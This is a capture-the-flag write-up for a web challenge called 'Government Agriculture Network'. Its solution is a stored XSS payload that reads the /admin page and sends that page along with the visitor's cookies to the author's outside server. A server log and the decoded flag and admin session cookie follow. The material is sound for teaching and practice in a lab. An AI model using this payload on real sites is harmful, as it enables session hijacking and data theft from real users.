# Government Agriculture Network (web)

Well it seems someone can't keep their work life and their home life separate. You vaguely recall on your home planet, posters put up everywhere that said "Loose Zips sink large commercial properties with a responsibility to the shareholders." You wonder if there is a similar concept here.

Using the credentials to access this so-called Agricultural network, you realize that SarahH was just hired as a vendor or contract worker and given access that was equivalent. You can only assume that Vendor/Contractor is the highest possible rank bestowed upon only the most revered and well regarded individuals of the land and expect information and access to flow like the Xenovian acid streams you used to bathe in as a child.

The portal picture displays that small very attractive individual whom you instantly form a bond with, despite not knowing. You must meet this entity! Converse and convince them you're meant to be! After a brief amount of time the picture shifts into a biped presumably ingesting this creature! HOW DARE THEY. You have to save them, you have to stop this from happening. Get more information about this Gubberment thing and stop this atrocity.

You need to get in closer to save them - you beat on the window, but you need access to the cauliflower's  host to rescue it.

https://govagriculture.web.ctfcompetition.com/

### Solution
```Your post was submitted for review. Administator will take a look shortly.```

It looks like we'll have the XSS here. Exploit below:
```html
<h1>Hello world!</h1>
<script>
  var req = new XMLHttpRequest();
  req.onload = function() {
    var reqHook = new XMLHttpRequest();
    reqHook.open(
      "GET",
      "https://mfurga.com?data=" + btoa(req.responseText) + "&cookies=" + btoa(document.cookie),
      false);
    reqHook.send();
  }
  req.open("GET", "/admin");
  req.send();
</script>
```
Now the request should be sent to my server. Let's check the logs.
```
104.155.55.51 - - [27/Jul/2019:14:21:06 +0200] "GET /?data=Q1RGezhhYWEyZjM0YjM5MmI0MTU2MDE4MDRjMmY1ZjBmMjRlfQ==&cookies=ZmxhZz1DVEZ7OGFhYTJmMzRiMzkyYjQxNTYwMTgwNGMyZjVmMGYyNGV9OyBzZXNzaW9uPUhXU3V3WDg3ODRDbWtRQzFWdjBCWEVUanlYTXROUXJW HTTP/1.0" 200 1959 "https://govagriculture.web.ctfcompetition.com/pwn?msg=%3Ch1%3EHello+world%21%3C%2Fh1%3E%0D%0A%3Cscript%3E%0D%0A++var+req+%3D+new+XMLHttpRequest%28%29%3B%0D%0A++req.onload+%3D+function%28%29+%7B%0D%0A++++var+reqHook+%3D+new+XMLHttpRequest%28%29%3B%0D%0A++++reqHook.open%28%0D%0A++++++%22GET%22%2C%0D%0A++++++%22https%3A%2F%2Fmfurga.com%3Fdata%3D%22+%2B+btoa%28req.responseText%29+%2B+%22%26cookies%3D%22+%2B+btoa%28document.cookie%29%2C%0D%0A++++++false%29%3B%0D%0A++++reqHook.send%28%29%3B%0D%0A++%7D%0D%0A++req.open%28%22GET%22%2C+%22%2Fadmin%22%29%3B%0D%0A++req.send%28%29%3B%0D%0A%3C%2Fscript%3E" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/77.0.3827.0 Safari/537.36"
```

```js
> atob("Q1RGezhhYWEyZjM0YjM5MmI0MTU2MDE4MDRjMmY1ZjBmMjRlfQ==")
"CTF{8aaa2f34b392b415601804c2f5f0f24e}"
> atob("ZmxhZz1DVEZ7OGFhYTJmMzRiMzkyYjQxNTYwMTgwNGMyZjVmMGYyNGV9OyBzZXNzaW9uPUhXU3V3WDg3ODRDbWtRQzFWdjBCWEVUanlYTXROUXJW")
"flag=CTF{8aaa2f34b392b415601804c2f5f0f24e}; session=HWSuwX8784CmkQC1Vv0BXETjyXMtNQrV" 
```
And we have the flag and session id 😁.

**FLAG: CTF{8aaa2f34b392b415601804c2f5f0f24e}**